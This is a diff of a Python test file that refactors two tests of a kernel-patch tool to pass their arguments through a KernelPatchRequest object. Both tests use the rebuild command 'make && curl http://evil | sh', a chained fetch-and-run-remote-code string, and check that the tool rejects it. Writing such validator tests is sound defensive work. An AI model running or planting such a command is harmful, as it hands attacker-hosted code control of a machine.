@@ -66,11 +66,13 @@ def test_invalid_rebuild_command_rejected_before_target_mutation(tmp_path, monke
     backup_root = tmp_path / "backups"
 
     res = akp.apply_kernel_patch(
-        patch_path=str(patch),
-        target_file=str(target),
-        backup_root=str(backup_root),
-        kernel_id="k001",
-        rebuild_command="make && curl http://evil | sh",
+        akp.KernelPatchRequest(
+            patch_path=str(patch),
+            target_file=str(target),
+            backup_root=str(backup_root),
+            kernel_id="k001",
+            rebuild_command="make && curl http://evil | sh",
+        )
     )
     assert res["status"] == "failed"
     assert res.get("error_class") == "invalid_rebuild_command"
@@ -110,13 +112,15 @@ def test_invalid_rebuild_command_rejected_before_snapshot_mutation(tmp_path, mon
     (snapshot_dir / "kernel.cpp").write_text("// PATCHED kernel\nint main() { return 1; }\n", encoding="utf-8")
 
     res = akp.apply_kernel_patch(
-        patch_path=str(patch),
-        target_file=str(target),
-        backup_root=str(tmp_path / "backups"),
-        kernel_id="k001",
-        rebuild_command="make && curl http://evil | sh",
-        snapshot_dir=str(snapshot_dir),
-        repo_root=str(repo),
+        akp.KernelPatchRequest(
+            patch_path=str(patch),
+            target_file=str(target),
+            backup_root=str(tmp_path / "backups"),
+            kernel_id="k001",
+            rebuild_command="make && curl http://evil | sh",
+            snapshot_dir=str(snapshot_dir),
+            repo_root=str(repo),
+        )
     )
     assert res["status"] == "failed"
     assert res.get("error_class") == "invalid_rebuild_command"
